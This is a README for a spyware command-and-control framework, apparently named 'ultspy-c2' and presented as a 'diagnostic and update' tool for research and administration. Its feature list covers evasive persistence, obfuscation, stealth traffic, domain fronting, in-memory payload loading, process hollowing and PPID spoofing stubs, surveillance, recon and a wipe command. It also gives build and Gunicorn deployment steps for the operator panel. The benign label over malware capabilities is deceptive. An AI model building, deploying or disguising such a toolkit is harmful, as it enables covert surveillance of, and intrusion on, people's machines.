# Distributed Diagnostic & Update Framework

## Projektbeschreibung

Dieses Projekt stellt ein verteiltes Systemdiagnose- und Remote-Update-Framework dar. Ziel ist die Entwicklung einer modularen, erweiterbaren Plattform für Remote-Monitoring, Diagnose und Softwareaktualisierung von verteilten Clientsystemen in größeren Infrastrukturen.

## Zielsetzung

- Modularer, dynamisch erweiterbarer Client-Agent (C++)
- Zentrale Management-Komponente (Python, Flask-API)
- Sichere verschlüsselte Kommunikation (AES-256)
- UUID-basierte Client-Identifikation
- Systemfingerprinting für Diagnosezwecke
- Remote-Updatefähigkeit
- Steuer- und Kommandomodul für zukünftige Diagnosen

**Hinweis:**  
Dieses Projekt dient ausschließlich zu Forschungs-, Entwicklungs- und Systemadministrationszwecken im Bereich der verteilten Systemverwaltung.

---

## Architekturübersicht

### Client (C++)

- Loader: Startet beim Systemstart, lädt Module dynamisch
- Fingerprinting: Erfasst Diagnosedaten (System, UUID etc.)
- Update-Handler: Führt Remote-Updates durch
- Command-Handler: Empfängt und verarbeitet Steuerkommandos
  - Kommandos werden pluginbasiert über eine Registry geladen
- Crypto: AES-256-CBC-Verschlüsselung der Datenübertragung
- Key-Exchange: RSA-4096 initialer Schluessel
- Fortgeschrittener Persistenz-Layer (Run-Key, verschleierte Tasks, ADS, WMI-Vorbereitung)
- Safe-Mode bei Serverkommando
- Wipe- und Deep-Sleep-Kommandos
- Erste Obfuskationsschicht: verschluesselte Strings und Control-Flow-Flattening im Command-Handler
- Zufällige HTTP-Header pro Client-Session zur Stealth-Kommunikation
- Vorbereitung für Domain Fronting mit konfigurierbaren Zieladressen
- HMAC-Signaturen mit Nonce- und Timestamp-Prüfung gegen Replay-Attacken
- IPC-Basis über eine Named Pipe `\\.\pipe\US_IPC_CORE` zur künftigen Kommunikation zwischen Modulen
- Hardened Loader lädt Module aus AES-verschlüsselten Payloads direkt aus dem Speicher
- Vorbereitende Anti-Forensik Stubs (Process Hollowing & PPID Spoofing)
- Initiales Recon-Modul sammelt umfangreiche Systeminformationen
- Active Surveillance Modul überwacht Prozesse und Autostart-Einträge
- Kommando-Templates erleichtern wiederkehrende Steuerbefehle

### Server (Python)

- REST-API (Flask)
- Agent-Registrierung & Heartbeats
- Online-Status mit Timeout (180s)
- Kommandomodul pro Client
- Persistente Datenhaltung (SQLite, vorbereitbar für PostgreSQL)
- Loggingsystem
- Admin-Schnittstelle mit API-Key-Authentifizierung
- Endpunkt `/payload/<uuid>/<module>` liefert verschlüsselte Module für den Loader
- Routing-Tabelle aus `config.json` erlaubt mehrere Zielhosts (Domain Fronting Vorbereitung)
- API-Schlüssel für Admin-Endpunkte werden ebenfalls in `config.json` gespeichert

---

## Setup

### Client
- CMake + GCC (C++)
- Eigenständiger modularer Build

### Server
- Python 3.x
- `pip install -r requirements.txt`

---

## Lizenz

Dieses Projekt ist für Forschungs- und Entwicklungszwecke bestimmt.

### Build-Anleitung

```
# Client
cd client && mkdir build && cd build
cmake .. && make

# Server
cd ../../server
pip install -r requirements.txt
python app.py
```
Der Server speichert pro Client den Zeitpunkt des letzten Heartbeats. Über `/status/<uuid>` lässt sich der Online-Status abrufen.

Der Client sendet beim ersten Start seinen RSA-Public-Key an `/key_exchange` und
erhält einen AES-256-Schlüssel zurück, der für die weitere Kommunikation
genutzt wird.

Kommandos werden nun als JSON-Objekt in der Form

```
{ "command": "SAFE_MODE", "parameters": {}}
```
übermittelt. Neue Befehle können als Plugins registriert werden und melden sich
beim `CommandRegistry` an.

Administratoren können über die API-Key geschützten Endpunkte `/admin/agents`, `/admin/logs/<uuid>` und `/admin/command/<uuid>` auf den Server zugreifen. Der API-Schlüssel wird via `X-API-KEY` Header übermittelt. Die Logs-Schnittstelle liefert Recon-Berichte und Servermeldungen eines Agents chronologisch als JSON.

### Web UI

A React-based interface in `frontend/` allows operators to log in with their API
key and manage agents. Open `/login` to enter the key; it is stored in
`localStorage` under `ULTSPY_API_KEY` and automatically sent with all
`/admin/*` requests. If the backend responds with `401 Unauthorized` the key is
cleared and the user is redirected to `/login`. Network issues trigger a global
"Verbindung zum Backend unterbrochen." banner.
Operators can log out via the header button which clears the stored key.
The **Agents** page retrieves data from `/admin/agents` and shows the online
state. A colored badge marks its stability as **Stable**, **Warning**, **Degraded** or **Offline** depending on the last heartbeat.
The **Commands** page lets an operator view the queued commands for a selected agent and submit new entries via
`/admin/command/<uuid>`. The **Logs** page zeigt gespeicherte Recon- und
Überwachungsdaten über `/admin/logs/<uuid>`. Die **Settings** Seite ruft
`/admin/config` ab und stellt die aktuellen Konfigurationswerte dar.
Command **Templates** vereinfachen wiederkehrende Befehle über `/admin/templates`.
 Start the development server with:

```bash
cd frontend
npm install
npm run dev
```

## Deployment

The production setup bundles the API server and compiled frontend into `/srv/ultspy-c2`:

```
/srv/ultspy-c2/
  backend
  frontend
  venv
```

1. Build the web interface:
   ```bash
   cd frontend
   npm install
   npm run build
   ```
   The static files appear in `frontend/dist/`.
2. Create a virtual environment and install the backend:
   ```bash
   cd ../server
   python -m venv /srv/ultspy-c2/venv
   source /srv/ultspy-c2/venv/bin/activate
   pip install -r requirements.txt
   ```
3. Launch the API with Gunicorn:
   ```bash
   gunicorn -w 4 -b 0.0.0.0:5000 wsgi:app
   ```
The backend should be reverse proxied by a web server like Nginx. Static frontend files can be served directly from `/srv/ultspy-c2/frontend`.
